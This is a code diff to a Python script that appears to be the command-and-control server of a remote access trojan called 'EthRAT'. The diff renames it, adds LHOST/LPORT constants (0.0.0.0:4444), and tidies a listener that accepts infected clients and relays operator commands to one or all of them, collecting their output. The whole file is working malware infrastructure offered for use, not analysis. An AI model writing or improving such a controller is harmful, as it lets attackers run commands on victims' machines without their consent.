@@ -8,6 +8,9 @@ import queue
 clients = {}
 shutdown = False 
 
+LHOST = "0.0.0.0"
+LPORT = 4444
+
 def logo():
     print(Fore.GREEN + r"""
 EEEEEEEEEEEEEEEEEEEEEE         tttt         hhhhhhh             RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
@@ -31,7 +34,7 @@ EEEEEEEEEEEEEEEEEEEEEE          ttttttttttt  hhhhhhh     hhhhhhhRRRRRRRR     RRR
 def handle_client(client_socket, addr, response_queue):
     clients[addr] = client_socket
     if os.name == "nt":
-        ctypes.windll.kernel32.SetConsoleTitleW(f"MY RAT | CONNECTED CLIENTS: {len(clients)}")
+        ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
 
     while not shutdown:
         try:
@@ -59,18 +62,18 @@ def accept_clients(server, response_queue):
                 print(f"Error accepting new client: {e}")
             break
 
-def start_server(host="0.0.0.0", port=4444):
+def start_server(lhost, lport):
     global shutdown
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((host, port))
+    server.bind((lhost, lport))
     server.listen(5)
 
-    response_queue = queue.Queue()  # Create a thread-safe queue
+    response_queue = queue.Queue()
     threading.Thread(target=accept_clients, args=(server, response_queue), daemon=True).start()
     os.system("cls" if os.name == "nt" else "clear")
     logo()
-    print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {host}:{port}")
+    print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {lhost}:{lport}")
     print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")
 
     while True:
@@ -83,13 +86,14 @@ def start_server(host="0.0.0.0", port=4444):
 
         try:
             choice = input("Select client number (or 0 to broadcast): ")
+
             if choice.lower() == "exit":
                 print(f"[{Fore.YELLOW}*{Fore.RESET}] Shutting down server...")
                 shutdown = True
                 server.close()
+                print(f"[{Fore.GREEN}+{Fore.RESET}] Server closed.")
                 for client in clients.values():
                     client.close()
-                print(f"[{Fore.GREEN}+{Fore.RESET}] Server closed.")
                 break
             elif choice.lower() == "list":
                 print("\n[Connected Clients]")
@@ -110,11 +114,9 @@ def start_server(host="0.0.0.0", port=4444):
                     print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
                     break
                 
-                # Send the command to all clients
                 for client in clients.values():
                     client.send(command.encode())
 
-                # Wait for responses from all clients
                 responses_received = 0
                 while responses_received < len(clients):
                     try:
@@ -143,4 +145,4 @@ def start_server(host="0.0.0.0", port=4444):
             print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")
 
 if __name__ == "__main__":
-    start_server()
+    start_server(LHOST, LPORT)
